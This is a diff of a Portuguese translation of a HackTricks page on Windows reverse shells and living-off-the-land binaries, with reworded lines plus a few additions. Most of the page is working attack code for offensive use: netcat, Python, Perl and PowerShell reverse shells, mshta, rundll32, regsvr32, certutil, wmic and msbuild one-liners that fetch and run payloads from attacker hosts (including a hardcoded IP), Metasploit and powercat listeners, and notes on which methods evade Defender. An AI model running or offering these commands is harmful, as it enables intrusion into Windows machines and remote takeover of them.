@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -24,8 +24,8 @@ Encontre vulnerabilidades que importam mais para que você possa corrigi-las mai
 
 ## Lolbas
 
-A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
-Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (ab)usados para realizar alguns tipos de ações inesperadas como **executar código arbitrário.**
+A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows, assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para Linux.\
+Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (mal)usados para realizar algum tipo de ação inesperada como **executar código arbitrário.**
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**sbd** é um clone do Netcat, projetado para ser portátil e oferecer criptografia forte. Funciona em sistemas operacionais semelhantes ao Unix e no Microsoft Win32. O sbd possui criptografia AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), execução de programas (opção -e), escolha de porta de origem, reconexão contínua com atraso e algumas outras características interessantes. O sbd suporta apenas comunicação TCP/IP. sbd.exe (parte da distribuição Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) pode ser carregado em um sistema Windows como uma alternativa ao Netcat.
+**sbd** é um clone do Netcat, projetado para ser portátil e oferecer criptografia forte. Ele roda em sistemas operacionais semelhantes ao Unix e no Microsoft Win32. sbd apresenta criptografia AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), execução de programas (opção -e), escolha de porta de origem, reconexão contínua com atraso e algumas outras funcionalidades interessantes. sbd suporta apenas comunicação TCP/IP. sbd.exe (parte da distribuição Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) pode ser enviado para um computador com Windows como uma alternativa ao Netcat.
 
 ## Python
 ```bash
@@ -41,6 +41,8 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
+
+Perl é uma linguagem de programação amplamente utilizada em hacking e pentesting devido à sua capacidade de executar comandos do sistema operacional e interagir com arquivos de forma eficiente. É comum ver scripts Perl sendo usados para criar backdoors e shells em sistemas Windows comprometidos.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -78,43 +80,43 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processo realizando chamada de rede: **powershell.exe**\
-Payload escrito no disco: **NÃO** (_pelo menos em nenhum lugar que eu pudesse encontrar usando procmon!_)
+Carga gravada no disco: **NÃO** (_pelo menos em nenhum lugar que eu pudesse encontrar usando o procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Chamada de rede realizada pelo processo: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
-
-**Uma linha:**
+Processo realizando chamada de rede: **svchost.exe**\
+Carga gravada no disco: **cache local do cliente WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Obtenha mais informações sobre diferentes Powershell Shells no final deste documento**
+**Obtenha mais informações sobre diferentes Shells do Powershell no final deste documento**
 
 ## Mshta
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
 Processo realizando chamada de rede: **mshta.exe**\
-Carga útil escrita no disco: **Cache local do IE**
+Carga útil escrita no disco: **cache local do IE**
 ```bash
 mshta http://webserver/payload.hta
 ```
 Processo realizando chamada de rede: **mshta.exe**\
-Carga útil escrita no disco: **Cache local do IE**
+Carga útil escrita no disco: **cache local do IE**
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Carga escrita no disco: **cache local do cliente WebDAV**
 
-#### **Exemplo de shell reverso hta-psh (usar hta para baixar e executar backdoor PS)**
+#### **Exemplo de shell reverso hta-psh (usa hta para baixar e executar backdoor PS)**
 ```markup
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Você pode baixar e executar facilmente um zumbi Koadic usando o stager hta**
+**Você pode baixar e executar muito facilmente um zombie Koadic usando o stager hta**
 
-#### exemplo hta
+#### Exemplo hta
+
+[**Daqui**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```markup
 <html>
 <head>
@@ -129,9 +131,9 @@ new ActiveXObject('WScript.Shell').Run(c);
 </body>
 </html>
 ```
-**Extraído de** [**aqui**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
-
 #### **mshta - sct**
+
+[**Daqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```markup
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -147,8 +149,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </script>
 </scriptlet>
 ```
-**Extraído de** [**aqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-
 #### **Mshta - Metasploit**
 ```bash
 use exploit/windows/misc/hta_server
@@ -164,21 +164,23 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Exemplo de Dll hello world**](https://github.com/carterjones/hello-world-dll)
+[**Exemplo de Dll olá mundo**](https://github.com/carterjones/hello-world-dll)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Carga gravada no disco: **cache local do cliente WebDAV**
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
 Processo realizando chamada de rede: **rundll32.exe**\
-Payload escrito no disco: **Cache local do IE**
+Carga gravada no disco: **cache local do IE**
 
 **Detectado pelo defensor**
 
 **Rundll32 - sct**
+
+[**Daqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```bash
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -193,8 +195,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </script>
 </scriptlet>
 ```
-**Extraído de** [**aqui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-
 #### **Rundll32 - Metasploit**
 ```bash
 use windows/smb/smb_delivery
@@ -215,16 +215,18 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 Processo realizando chamada de rede: **regsvr32.exe**\
-Payload escrito no disco: **Cache local do IE**
+Carga gravada no disco: **cache local do IE**
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Payload escrito no disco: **Cache local do cliente WebDAV**
+Carga gravada no disco: **cache local do cliente WebDAV**
 
-**Detectado pelo defender**
+**Detectado pelo defensor**
 
 #### Regsvr32 -sct
+
+[**Daqui**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 ```markup
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -241,8 +243,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </registration>
 </scriptlet>
 ```
-**Extraído de** [**aqui**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-
 #### **Regsvr32 - Metasploit**
 ```bash
 use multi/script/web_delivery
@@ -252,23 +252,24 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Você pode baixar e executar facilmente um zumbi Koadic usando o stager regsvr**
+**Você pode baixar e executar facilmente um zombie Koadic usando o stager regsvr**
 
 ## Certutil
 
-Baixe um B64dll, decodifique-o e execute-o.
+Baixe um B64dll, decodifique e execute.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Baixe um B64exe, decodifique-o e execute-o.
+Baixe um B64exe, decodifique e execute-o.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Detectado pelo defender**
+**Detectado pelo defensor**
+
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder monitora sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -289,7 +290,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Carga gravada no disco: **cache local do cliente WebDAV**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -298,7 +299,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Detectado pelo defender**
+**Detectado pelo defensor**
 
 ## **MSIExec**
 
@@ -318,9 +319,9 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 wmic os get /format:"https://webserver/payload.xsl"
 ```
 Processo realizando chamada de rede: **wmic.exe**\
-Payload escrito no disco: **Cache local do IE**
+Carga gravada no disco: **cache local do IE**
 
-Exemplo de arquivo xsl:
+Exemplo de arquivo xsl [aqui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -332,8 +333,6 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-Extraído de [aqui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
-
 **Não detectado**
 
 **Você pode baixar e executar muito facilmente um zumbi Koadic usando o stager wmic**
@@ -343,10 +342,10 @@ Extraído de [aqui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Payload escrito no disco: **cache local do cliente WebDAV**
 
-Você pode usar essa técnica para contornar a Lista de Permissões de Aplicativos e as restrições do Powershell.exe. Como resultado, será apresentado com um shell PS.\
-Basta baixar isso e executar: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Você pode usar essa técnica para burlar a Lista Branca de Aplicativos e as restrições do Powershell.exe. Pois você será solicitado com um shell do PS.\
+Basta baixar e executar isso: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -354,11 +353,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compile código C# na máquina vítima.
+Compilar código C# na máquina da vítima.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Você pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Não detectado**
 
@@ -367,9 +366,9 @@ Você pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Payload escrito no disco: **cache local do cliente WebDAV**
 
-**Eu não tentei isso**
+**Eu não tentei**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
@@ -378,29 +377,29 @@ Carga útil escrita no disco: **Cache local do cliente WebDAV**
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Processo realizando chamada de rede: **svchost.exe**\
-Carga útil escrita no disco: **Cache local do cliente WebDAV**
+Carga escrita no disco: **cache local do cliente WebDAV**
 
 **Eu não tentei**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Shells Powershell
+## Shells do Powershell
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Na pasta **Shells**, existem vários tipos diferentes de shells. Para baixar e executar Invoke-_PowerShellTcp.ps1_ faça uma cópia do script e acrescente ao final do arquivo:
+Na pasta **Shells**, existem vários shells diferentes. Para baixar e executar o Invoke-_PowerShellTcp.ps1_ faça uma cópia do script e adicione ao final do arquivo:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Comece a servir o script em um servidor web e execute-o no lado da vítima:
+Comece a servir o script em um servidor web e execute-o no final da vítima:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-O Defender não o detecta como código malicioso (ainda, 03/04/2019).
+Defender ainda não o detecta como código malicioso (ainda, 3/04/2019).
 
-**TODO: Verificar outros shells nishang**
+**TODO: Verificar outros shells do nishang**
 
 ### **PS-Powercat**
 
@@ -410,11 +409,11 @@ Baixe, inicie um servidor web, inicie o ouvinte e execute no lado da vítima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-O Defender não o detecta como código malicioso (ainda, 03/04/2019).
+Defender ainda não o detecta como código malicioso (ainda, 3/04/2019).
 
 **Outras opções oferecidas pelo powercat:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir arquivos...
+Conexão de shell, Shell reverso (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir arquivos...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -435,7 +434,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Crie um lançador powershell, salve-o em um arquivo e baixe e execute-o.
+Crie um iniciador powershell, salve-o em um arquivo e faça o download e execute-o.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -445,7 +444,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Crie uma versão powershell de backdoor metasploit usando unicorn
+Crie uma versão em powershell de uma backdoor do metasploit usando o unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -453,7 +452,7 @@ Inicie o msfconsole com o recurso criado:
 ```
 msfconsole -r unicorn.rc
 ```
-Inicie um servidor web que disponibilize o arquivo _powershell\_attack.txt_ e execute na vítima:
+Inicie um servidor web servindo o arquivo _powershell\_attack.txt_ e execute no alvo:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -478,21 +477,21 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rapidamente. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>Aprenda hacking em AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
